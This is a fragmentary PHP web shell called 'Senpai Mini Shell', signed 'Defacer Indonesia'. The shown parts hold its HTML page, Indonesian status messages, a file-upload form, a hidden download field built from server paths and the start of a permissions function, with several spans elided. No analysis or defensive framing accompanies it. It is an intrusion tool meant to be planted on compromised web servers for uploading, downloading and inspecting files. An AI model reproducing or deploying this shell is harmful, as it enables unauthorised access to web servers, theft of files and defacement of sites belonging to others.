...
<title>Senpai Mini Shell</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-image: url("https://xakep.ru/wp-content/uploads/2015/07/access-granted.png");
no-repeat fixed;-webkit-background-size: 100% 100%;-moz-background-size: 100% 100%;-o-background-size: 100% 100%;background-size: 100% 100%;}
color:green;
}
#content tr:hover{
...
<body>
<h1><center><font color="green">Senpai Mini Shell</font></center></h1>
...
echo '<font color="green">Sukses Stah :D</font><br />';
}else{
echo '<font color="red">Yah gagal :( Coba lagi deh</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="green">Upload Here :</font> <input type="file" name="file" />
...
<input type="hidden" name="download" value='.$dir.'/'.$file.'">
...
echo '<center><br/>Defacer Indonesia</center>
</body>
</html>';
function perms($file){
